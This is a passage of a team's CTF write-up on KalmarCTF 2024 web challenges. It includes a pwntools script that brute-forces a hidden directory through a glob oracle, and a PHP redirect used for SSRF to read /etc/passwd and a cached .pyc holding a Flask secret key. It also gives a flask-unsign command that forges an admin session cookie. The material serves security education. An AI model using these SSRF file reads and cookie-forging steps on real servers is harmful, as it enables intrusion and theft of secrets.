</pre></table></code></div></div><p>Globbing this should only produce a single result and we got <code class="language-plaintext highlighter-rouge">Invalid Protocol</code> so I next tried:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GET /whatever /app/static/assets/*
</pre></table></code></div></div><p>Which should produce &gt; 1 results. The output from the server this time was a <code class="language-plaintext highlighter-rouge">cat</code> error. Testing a glob which should produce 0 results gave <code class="language-plaintext highlighter-rouge">Invalid Protocol</code> too. This meant we had an oracle whereby we could detect whether there is &gt; 1 files in a directory.</p><p>We want to leak the hidden directory containing the flag (presumably). I decided using a regex approach would be best. We have to create a regex which exactly matches ONE of the known folders and then we can brute force values to find the hidden one (so that glob will return 2 files and give us that cat error)!</p><p>I’ll save you the manual nightmare which followed but you can see the workings below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]*
</pre></table></code></div></div><p>And for those of you who are perfectionists, gg0h wrote an automated solution which was pretty cool:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">known1</span> <span class="o">=</span> <span class="s">'f200d055a267ae56160198e0fcb47e5f'</span>
<span class="n">known2</span> <span class="o">=</span> <span class="s">'26c3f25922f71af3372ac65a75cd3b11'</span>

<span class="n">total_payload</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">directory</span> <span class="o">=</span> <span class="s">''</span>

<span class="k">def</span> <span class="nf">attempt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chal-kalmarc.tf'</span><span class="p">,</span><span class="mi">8080</span><span class="p">)</span>
    <span class="n">req</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""
HEAD /assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/</span><span class="si">{</span><span class="n">total_payload</span><span class="si">}{</span><span class="n">payload</span><span class="si">}</span><span class="s">*
Host: chal-kalmarc.tf:8080
    """</span><span class="p">.</span><span class="n">lstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">req</span><span class="p">)</span> 
    <span class="n">resp</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">known1</span><span class="p">)):</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span><span class="p">[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
    <span class="n">charset</span> <span class="o">=</span> <span class="n">charset</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">known2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">''</span><span class="p">)</span>

    <span class="c1"># case where known1[i] == target[i]
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">known1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">]"</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">attempt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="sa">b</span><span class="s">'No such file or directory'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="n">total_payload</span> <span class="o">+=</span> <span class="n">payload</span>
        <span class="n">directory</span> <span class="o">+=</span> <span class="n">known1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">print</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
        <span class="k">continue</span>

    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'[</span><span class="si">{</span><span class="n">c</span><span class="si">}{</span><span class="n">known1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">]'</span>     
        <span class="n">resp</span> <span class="o">=</span> <span class="n">attempt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'No such file or directory'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
            <span class="n">total_payload</span> <span class="o">+=</span> <span class="n">payload</span>
            <span class="n">directory</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">print</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">break</span>

    <span class="c1"># no match by this point means known2[i] == target[i]
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span>
        <span class="n">total_payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">known1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}{</span><span class="n">known2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">]"</span>
        <span class="n">directory</span> <span class="o">+=</span> <span class="n">known2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">print</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
    
    <span class="k">print</span><span class="p">(</span><span class="n">total_payload</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>

<span class="n">flag_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""
GET /assets/</span><span class="si">{</span><span class="n">directory</span><span class="si">}</span><span class="s">/flag.txt HTTP/1.1
Host: chal-kalmarc.tf:8080
"""</span><span class="p">.</span><span class="n">lstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chal-kalmarc.tf'</span><span class="p">,</span><span class="mi">8080</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">flag_payload</span><span class="p">)</span> 
<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
</pre></table></code></div></div><p>Either way, you will find the hidden directory is <code class="language-plaintext highlighter-rouge">9df5256fe48859c91122cb92964dbd66</code> and you can find the flag located at <code class="language-plaintext highlighter-rouge">/assets/9df5256fe48859c91122cb92964dbd66/flag.txt</code> to solve it!</p><p><code class="language-plaintext highlighter-rouge">kalmar{17b29adf_bash_web_server_was_a_mistake_374add33}</code></p><h2 id="webis-it-down"><span class="mr-2">web/Is It Down</span><a href="#webis-it-down" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was yet another sourceless web challenge.</p><p>We noticed the obvious SSRF straight away. If you intercept the HTTP request you can find the response is given. We tried to use a redirect to a http server and found that it worked. This meant that we could send it to our https website and then redirect to a non-http address from there. Next, gg0h was able to use the <code class="language-plaintext highlighter-rouge">file://</code> URI to leak local files and read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p><p>I wrote my own PHP script to allow me to automatically play with this bug:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: "</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>This way I could host it on my HTTPS domain and send the bot to:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://ireland.re/exploit.php?x=file:///etc/passwd
</pre></table></code></div></div><p>Again, the same process of dumping files followed. Similarly, gg0h came in good with the <code class="language-plaintext highlighter-rouge">/proc/1/cmdline</code> file which contained a reference to this <code class="language-plaintext highlighter-rouge">/etc/uwsgi/uwsgi-custom.ini</code> file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[uwsgi]
uid = www-data
gid = www-data
master = true
processes = 20
http-socket = 0.0.0.0:5000
chmod-sock = 664
vacuum = true
die-on-term = true
wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py
callable = app
pythonpath = /usr/local/lib/python3.11/site-packages
</pre></table></code></div></div><p>This file contained a reference to <code class="language-plaintext highlighter-rouge">/var/www/keep-dreaming-sonny-boy/app.py</code> as can be seen above!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">abort</span>
<span class="kn">from</span> <span class="nn">requestlib</span> <span class="kn">import</span> <span class="n">fetch</span>
<span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">session_encryption_key</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">protect_secrets</span><span class="p">():</span>
    <span class="n">os</span><span class="p">.</span><span class="n">unlink</span><span class="p">(</span><span class="s">"config.py"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">check_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="nb">str</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="s">"Please provide a regular URL!"</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"https://"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">url</span><span class="p">.</span><span class="n">lstrip</span><span class="p">()</span> <span class="o">!=</span> <span class="n">url</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="s">"URL must start with 'https://'. We do not want anything insecure here!"</span>

    <span class="k">return</span> <span class="bp">True</span><span class="p">,</span> <span class="s">""</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="s">'static'</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="s">'/assets/'</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">session_encryption_key</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Using key:"</span><span class="p">,</span> <span class="n">app</span><span class="p">.</span><span class="n">secret_key</span><span class="p">)</span>

<span class="n">protect_secrets</span><span class="p">()</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s">'pages'</span><span class="p">,</span> <span class="s">'index.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">healthcheck</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"admin"</span><span class="p">)</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="s">"/readflag"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/check'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"url"</span><span class="p">)</span>
    <span class="n">valid</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">check_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">valid</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
            <span class="s">'error'</span><span class="p">:</span> <span class="n">err</span>
        <span class="p">}</span>

    <span class="k">if</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s">'success'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
            <span class="s">'online'</span><span class="p">:</span> <span class="n">content</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">,</span>
            <span class="s">'content'</span><span class="p">:</span> <span class="n">content</span>
        <span class="p">}</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">10600</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></table></code></div></div><p>No more sourceless! We know we need to visit <code class="language-plaintext highlighter-rouge">/flag</code> with <code class="language-plaintext highlighter-rouge">admin</code> set to <code class="language-plaintext highlighter-rouge">True</code> which means we would need to leak the <code class="language-plaintext highlighter-rouge">session_encryption_key</code> value.</p><p>Sadly, the <code class="language-plaintext highlighter-rouge">config.py</code> file is deleted at runtime. We got stuck here for some time and went down some uWSGI rabbit holes. We also looked into the possibility to leaked the stdout where the value is printed to the screen.</p><p>Some time later it hit me and I recalled that <code class="language-plaintext highlighter-rouge">__pycache__</code> exists! I spun up an environment with the same Python version (<code class="language-plaintext highlighter-rouge">3.11</code>) and generated some pycache. This allowed me to predict the path: <code class="language-plaintext highlighter-rouge">/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc</code> and it was dumped!</p><p>What followed was a little bit of “reverse engineering” to pick apart from the output which part was the key:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>\xa7\\r\\r\\n\\x00\\x00\\x00\\x00:\\xbe\\xf5e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00
</pre></table></code></div></div><p>Then I simply used <code class="language-plaintext highlighter-rouge">flask-unsign</code> like so:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flask-unsign <span class="nt">--sign</span> <span class="nt">--cookie</span> <span class="s2">"{'admin': True}"</span> <span class="nt">--secret</span> <span class="s2">"Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL"</span>
</pre></table></code></div></div><p>Copy this to your <code class="language-plaintext highlighter-rouge">session</code> cookie and visit <code class="language-plaintext highlighter-rouge">/flag</code> to solve it.</p><p><code class="language-plaintext highlighter-rouge">kalmar{Rem3Mbr_T0_fl0sh!}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=KalmarCTF 2024 Web Challenges - Ireland.RE&amp;url=https://ireland.re/posts/KalmarCTF_2024/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=KalmarCTF 2024 Web Challenges - Ireland.RE&amp;u=https://ireland.re/posts/KalmarCTF_2024/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/KalmarCTF_2024/&amp;text=KalmarCTF 2024 Web Challenges - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_CTF_2023_Web/"><div class="card-body"> <em class="timeago small" data-ts="1702857600" > 2023-12-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor CTF 2023 Web Challenges</h3><div class="text-muted small"><p> web/too-many-admins Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql). I immediately noticed the SQL injection h...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/UofTCTF_2024/" class="btn btn-outline-primary" prompt="Older"><p>UofTCTF 2024 Challenge Writeups</p></a> <a href="/posts/CursedCTF_2024/" class="btn btn-outline-primary" prompt="Newer"><p>CursedCTF 2024</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
